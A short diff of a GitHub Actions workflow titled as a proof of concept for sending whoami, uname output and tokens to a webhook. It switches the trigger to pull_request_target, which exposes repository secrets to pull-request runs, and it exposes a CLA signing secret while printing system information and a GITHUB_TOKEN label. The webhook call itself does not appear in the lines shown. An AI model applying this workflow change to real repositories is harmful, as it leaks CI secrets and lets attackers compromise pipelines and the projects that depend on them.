@@ -1,7 +1,7 @@
 name: PoC - whoami, uname, tokens to webhook
 
 on:
-  pull_request:
+  pull_request_target:
     types: [opened, synchronize]
 
 jobs:
@@ -14,7 +14,6 @@ jobs:
           CLA_SIGN_TOKEN: ${{ secrets.CLA_SIGN_TOKEN }}
         run: |
           echo "Running as user:"
-          whoami
           echo "System info:"
           uname -a
           echo "GITHUB_TOKEN:"
